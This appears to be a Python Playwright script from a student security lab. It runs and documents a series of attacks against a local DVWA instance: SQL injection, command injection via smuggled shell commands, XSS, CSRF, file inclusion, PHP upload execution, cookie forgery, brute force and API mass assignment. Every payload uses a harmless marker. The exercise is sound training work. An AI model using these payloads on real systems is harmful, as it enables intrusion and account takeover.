from pathlib import Path
import json, time, traceback, threading, functools, http.server, base64
from urllib.parse import urlencode, quote
from playwright.sync_api import sync_playwright
R=Path(__file__).resolve().parents[1]; OUT=R/'evidence/attacks'; IMG=R/'docs/captures/attacks'
OUT.mkdir(exist_ok=True); IMG.mkdir(exist_ok=True)
results=[]
class Quiet(http.server.SimpleHTTPRequestHandler):
 def log_message(self,*a): pass
fixtures=OUT/'witness'; fixtures.mkdir(exist_ok=True)
(fixtures/'destination.html').write_text('<html lang="fr"><meta charset="utf-8"><h1>GROUPE 12 — Destination témoin locale</h1><p>Le navigateur a suivi la redirection vers le port 4290.</p></html>')
(fixtures/'csrf.html').write_text('<html lang="fr"><meta charset="utf-8"><h1>Page témoin CSRF — origine 127.0.0.1:4290</h1><p>Ce bouton déclenche une requête de changement de mot de passe dans DVWA.</p><form action="http://127.0.0.1:4280/vulnerabilities/csrf/" method="get"><input type="hidden" name="password_new" value="G12-Test-2026!"><input type="hidden" name="password_conf" value="G12-Test-2026!"><input type="hidden" name="Change" value="Change"><button>Déclencher le test CSRF local</button></form></html>')
server=http.server.ThreadingHTTPServer(('127.0.0.1',4290),functools.partial(Quiet,directory=str(fixtures)))
threading.Thread(target=server.serve_forever,daemon=True).start()
with sync_playwright() as pw:
 browser=pw.chromium.launch(executable_path='/home/modou/.cache/ms-playwright/chromium-1234/chrome-linux64/chrome',headless=True,args=['--no-sandbox'])
 def login(port=4280,user='admin',password='password',level='low'):
  c=browser.new_context(viewport={'width':1280,'height':960}); pg=c.new_page(); pg.set_default_timeout(12000)
  pg.goto(f'http://127.0.0.1:{port}/login.php'); pg.locator('[name=username]').fill(user); pg.locator('[name=password]').fill(password); pg.locator('[name=Login]').click()
  assert 'login.php' not in pg.url, f'login failed {user}'
  c.add_cookies([{'name':'security','value':level,'url':f'http://127.0.0.1:{port}/'}]); return c,pg
 def go(pg,m,params=None):
  return pg.goto('http://127.0.0.1:4280/vulnerabilities/'+m+'/'+('?' + urlencode(params) if params else ''))
 def post(pg,values):
  pg.evaluate('''values=>{let f=document.createElement('form');f.method='POST';f.action=location.href;for(let [k,v] of Object.entries(values)){let i=document.createElement('input');i.name=k;i.value=v;f.append(i)}document.body.append(f);f.submit()}''',values); pg.wait_for_load_state('networkidle')
 def snap(pg,label):
  name=cur['id']+'-'+label+'.png'; pg.screenshot(path=str(IMG/name),full_page=True)
  text=pg.locator('body').inner_text(); (OUT/(cur['id']+'-'+label+'.txt')).write_text(text)
  cur['captures'].append({'file':name,'label':label,'url':pg.url}); return text
 def note(**kwargs): cur.update(kwargs)
 def run(id,module,fn):
  global cur
  cur={'id':id,'module':module,'date':time.strftime('%Y-%m-%d %H:%M:%S'),'captures':[],'status':'en cours'}
  try: fn(); cur['status']='exécuté'
  except Exception as e: cur['status']='à reprendre'; cur['error']=str(e); traceback.print_exc(limit=2)
  results.append(cur); (OUT/'results.json').write_text(json.dumps(results,ensure_ascii=False,indent=2)); print(id,cur['status'],cur.get('observed',cur.get('error','')),flush=True)
 def sql():
  c,p=login(); go(p,'sqli',{'id':'1','Submit':'Submit'}); normal=snap(p,'normal')
  payload="1' OR '1'='1' #"; go(p,'sqli',{'id':payload,'Submit':'Submit'}); t=snap(p,'attaque'); assert t.count('First name:')>normal.count('First name:')
  note(payload=payload,observed=f"Usage normal : {normal.count('First name:')} utilisateur ; injection : {t.count('First name:')} utilisateurs.",success=True); c.close()
 run('T01','sqli',sql)
 def blind():
  c,p=login(); values=[]
  for label,v in [('vrai',"1' AND '1'='1' #"),('faux',"1' AND '1'='2' #")]:
   r=go(p,'sqli_blind',{'id':v,'Submit':'Submit'}); t=snap(p,label); values.append((label,r.status,'User ID exists' in t,'MISSING' in t))
  assert values[0][2] and values[1][3]; note(payload="1' AND '1'='1' # / 1' AND '1'='2' #",observed=str(values),success=True); c.close()
 run('T02','sqli_blind',blind)
 def command():
  c,p=login(); go(p,'exec'); p.locator('[name=ip]').fill('127.0.0.1'); p.locator('[name=Submit]').click(); snap(p,'normal')
  payload='127.0.0.1; printf G12_COMMAND_OK'; p.locator('[name=ip]').fill(payload); p.locator('[name=Submit]').click(); t=snap(p,'attaque'); assert 'G12_COMMAND_OK' in p.locator('pre').inner_text(); note(payload=payload,observed='Le marqueur G12_COMMAND_OK est présent dans la sortie du shell après le ping.',success=True); c.close()
 run('T03','exec',command)
 def xss(mod,stored=False,dom=False):
  c,p=login(); marker='G12_'+mod.upper(); payload=f'<script>document.body.prepend("{marker}")</script>'
  if stored:
   go(p,mod); post(p,{'txtName':'G12TEST','mtxMessage':payload,'btnSign':'Sign Guestbook'}); snap(p,'publication'); c2,v=login(); go(v,mod); t=snap(v,'visiteur-distinct'); assert t.startswith(marker); c2.close()
  elif dom:
   go(p,mod,{'default':'French'}); snap(p,'normal'); payload='</option></select>'+payload; go(p,mod,{'default':payload}); t=snap(p,'attaque'); assert t.startswith(marker)
  else:
   go(p,mod,{'name':'Bonjour groupe 12'}); snap(p,'normal'); go(p,mod,{'name':payload}); t=snap(p,'attaque'); assert t.startswith(marker)
  note(payload=payload,observed=f'Le JavaScript injecté a ajouté le texte {marker} au début du document'+(' dans une seconde session, sans nouvelle publication.' if stored else '.'),success=True); c.close()
 run('T04','xss_r',lambda:xss('xss_r'))
 run('T05','xss_s',lambda:xss('xss_s',stored=True))
 run('T06','xss_d',lambda:xss('xss_d',dom=True))
 def csrf():
  c,p=login()
  try:
   p.goto('http://127.0.0.1:4290/csrf.html'); snap(p,'origine-temoin'); p.locator('button').click(); t=snap(p,'changement'); assert 'Password Changed.' in t
   c2,v=login(password='G12-Test-2026!'); snap(v,'reconnexion'); c2.close(); note(payload='GET password_new=G12-Test-2026!&password_conf=G12-Test-2026!&Change=Change depuis :4290',observed='Changement déclenché depuis une autre origine, puis reconnexion réussie avec le nouveau mot de passe. Origines différentes mais same-site.',success=True)
  finally:
   go(p,'csrf',{'password_new':'password','password_conf':'password','Change':'Change'}); c.close()
 run('T07','csrf',csrf)
 def fi():
  c,p=login(); go(p,'fi',{'page':'include.php'}); snap(p,'normal'); go(p,'fi',{'page':'../../robots.txt'}); t=snap(p,'attaque'); assert 'User-agent' in t; note(payload='page=../../robots.txt',observed='Le contenu de robots.txt est inclus depuis un chemin extérieur au dossier du module.',success=True); c.close()
 run('T08','fi',fi)
 def upload():
  c,p=login(); go(p,'upload'); p.locator('[name=uploaded]').set_input_files({'name':'g12-temoin.php','mimeType':'application/x-php','buffer':b"<?php echo 'G12_UPLOAD_EXECUTED'; ?>"}); p.locator('[name=Upload]').click(); t=snap(p,'televersement'); assert 'succes' in t.lower()
  p.goto('http://127.0.0.1:4280/hackable/uploads/g12-temoin.php'); t=snap(p,'execution'); assert t.strip()=='G12_UPLOAD_EXECUTED'; note(payload="g12-temoin.php : <?php echo 'G12_UPLOAD_EXECUTED'; ?>",observed='Le fichier PHP téléversé a été interprété ; la réponse contient uniquement G12_UPLOAD_EXECUTED.',success=True); c.close()
 run('T09','upload',upload)
 def auth():
  c,p=login(user='gordonb',password='abc123'); snap(p,'compte-ordinaire'); go(p,'authbypass/get_user_data.php'.rstrip('/')); t=snap(p,'donnees'); assert 'admin' in t and 'surname' in t; note(payload='GET /vulnerabilities/authbypass/get_user_data.php avec la session gordonb',observed='Le compte non administrateur obtient les informations des cinq utilisateurs sur la route de données.',success=True); c.close()
 run('T10','authbypass',auth)
 def bac():
  c,p=login(user='gordonb',password='abc123'); c.add_cookies([{'name':'user_id','value':'2','url':'http://127.0.0.1:4280/'}]); go(p,'bac',{'action':'view','user_id':'1'}); t=snap(p,'refus'); assert 'Access denied' in t
  c.add_cookies([{'name':'user_id','value':'1','url':'http://127.0.0.1:4280/'}]); go(p,'bac',{'action':'view','user_id':'1'}); t=snap(p,'cookie-falsifie'); assert 'User ID: 1' in t; note(payload='Cookie user_id=1 ; ?action=view&user_id=1 sous gordonb',observed='Le profil 1 est refusé avec user_id=2 puis affiché après falsification du cookie en 1.',success=True); c.close()
 run('T11','bac',bac)
 def brute():
  c,p=login(); outcomes=[]
  for i,pwd in enumerate(['G12-faux1','G12-faux2','password'],1):
   t0=time.monotonic(); go(p,'brute',{'username':'admin','password':pwd,'Login':'Login'}); t=snap(p,'essai-'+str(i)); outcomes.append({'password':pwd,'seconds':round(time.monotonic()-t0,3),'accepted':'Welcome to the password protected area' in t})
  assert [x['accepted'] for x in outcomes]==[False,False,True]; note(payload='admin : G12-faux1, G12-faux2, password',observed='Deux échecs puis succès avec le mot de passe connu, sans blocage de cette série de trois essais.',attempts=outcomes,success=True); c.close()
 run('T12','brute',brute)
 def weak():
  c,p=login(); go(p,'weak_id'); snap(p,'module'); vals=[]
  for _ in range(4):
   post(p,{'Generate':'Generate'}); vals.append(next(x['value'] for x in c.cookies() if x['name']=='dvwaSession'))
  assert int(vals[-1])==int(vals[-2])+1; note(payload='Quatre POST Generate successifs ; lecture du cookie dvwaSession',observed='Valeurs observées : '+', '.join(vals)+'. La quatrième est égale à la troisième + 1.',values=vals,success=True); c.close()
 run('T13','weak_id',weak)
 def captcha():
  c,p=login(); go(p,'captcha'); snap(p,'etat-initial')
  try:
   post(p,{'step':'2','password_new':'G12-Test-2026!','password_conf':'G12-Test-2026!','Change':'Change'}); t=snap(p,'saut-etape')
   c2,v=login(password='G12-Test-2026!'); snap(v,'reconnexion'); c2.close(); note(payload='POST step=2&password_new=G12-Test-2026!&password_conf=G12-Test-2026!&Change=Change',observed='Le saut direct à step=2 a changé le mot de passe ; reconnexion confirmée. Aucun CAPTCHA externe n’a été résolu.',success=True)
  finally:
   go(p,'csrf',{'password_new':'password','password_conf':'password','Change':'Change'}); c.close()
 run('T14','captcha',captcha)
 def csp():
  c,p=login(level='medium'); r=go(p,'csp'); hdr=r.headers.get('content-security-policy'); payload='<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">document.body.prepend("G12_CSP_EXECUTED")</script>'; p.locator('[name=include]').fill(payload); p.locator('input[type=submit]').click(); t=snap(p,'nonce-reutilise'); assert t.startswith('G12_CSP_EXECUTED'); note(payload=payload,observed='Le script muni du nonce statique a été exécuté malgré la présence de CSP.',csp=hdr,success=True); c.close()
 run('T15','csp',csp)
 def javascript():
  c,p=login(); go(p,'javascript'); p.locator('#phrase').fill('success'); p.locator('#send').click(); snap(p,'jeton-initial'); p.evaluate("document.getElementById('phrase').value='success'; generate_token();"); token=p.locator('#token').input_value(); p.locator('#send').click(); t=snap(p,'jeton-recalcule'); assert 'Well done' in t; note(payload="document.getElementById('phrase').value='success'; generate_token(); puis Submit",observed='Le jeton recalculé côté client est accepté : Well done.',token=token,success=True); c.close()
 run('T16','javascript',javascript)
 def redirect():
  c,p=login(); url='http://127.0.0.1:4280/vulnerabilities/open_redirect/source/low.php?'+urlencode({'redirect':'http://127.0.0.1:4290/destination.html'}); r=c.request.get(url,max_redirects=0); p.goto(url); t=snap(p,'destination'); assert p.url=='http://127.0.0.1:4290/destination.html'; note(payload=url,observed='La réponse redirige le navigateur vers la destination contrôlée sur :4290.',http=r.status,location=r.headers.get('location'),success=True); c.close()
 run('T17','open_redirect',redirect)
 def crypto():
  c,p=login(); go(p,'cryptography'); challenge='Lg4WGlQZChhSFBYSEB8bBQtPGxdNQSwEHREOAQY='; p.locator('#message').fill(challenge); p.locator('#direction_decode').check(); p.locator('form[name=xor] input[type=submit]').click(); t=snap(p,'xor-decode'); assert 'Olifant' in t; p.locator('#password').fill('Olifant'); p.locator('input[value=Login]').click(); t=snap(p,'connexion-defi'); assert 'Welcome back user' in t; note(payload='Décodage XOR du message du défi, puis mot de passe Olifant',observed='Le message intercepté révèle Olifant ; le formulaire du mini-défi accepte ce mot de passe.',success=True); c.close()
 run('T18a','cryptography',crypto)
 def ecb():
  c,p=login(level='medium'); go(p,'cryptography'); ts=p.locator('textarea').all_text_contents(); blocks=[[s[i:i+32] for i in range(0,len(s),32)] for s in ts[:3]]; payload=blocks[1][0]+blocks[2][1]+blocks[0][2]+''.join(blocks[1][3:]); p.locator('#token').fill(payload); p.locator('input[type=submit]').click(); t=snap(p,'blocs-recombines'); assert 'Welcome administrator Sweep' in t; note(payload=payload,observed='La recomposition de blocs ECB de trois jetons est acceptée comme administrator Sweep.',success=True); c.close()
 run('T18b','cryptography',ecb)
 def api_versions():
  c,p=login(); p.goto('http://127.0.0.1:4280/vulnerabilities/api/v2/user/'); a=snap(p,'v2'); p.goto('http://127.0.0.1:4280/vulnerabilities/api/v1/user/'); b=snap(p,'v1'); assert 'password' not in a and 'password' in b; note(payload='GET /vulnerabilities/api/v2/user/ puis /v1/user/',observed='La version v1 expose les hachages password absents de v2.',success=True); c.close()
 run('T19a','api',api_versions)
 def api_mass():
  c,p=login(); url='http://127.0.0.1:4280/vulnerabilities/api/v2/user/2'; original=c.request.get(url).json(); r=c.request.put(url,data={'name':'morph','level':0}); changed=r.json(); after=c.request.get(url).json(); note(payload='PUT /vulnerabilities/api/v2/user/2 JSON {"name":"morph","level":0}',observed='Réponse de modification : '+json.dumps(changed)+' ; relecture : '+json.dumps(after),before=original,response=changed,after=after,success=changed.get('level')==0); p.goto(url); snap(p,'relecture'); c.close()
 run('T19b','api',api_mass)
 def api_exec():
  c,p=login(); url='http://127.0.0.1:4280/vulnerabilities/api/v2/health/connectivity'; r=c.request.post(url,data={'target':'127.0.0.1; printf G12_API_COMMAND'}); data=r.json(); assert 'G12_API_COMMAND' in json.dumps(data); note(payload='POST /vulnerabilities/api/v2/health/connectivity JSON {"target":"127.0.0.1; printf G12_API_COMMAND"}',observed='Le marqueur G12_API_COMMAND est présent dans la réponse JSON.',response=data,success=True); c.close()
 run('T19c','api',api_exec)
 browser.close()
server.shutdown()
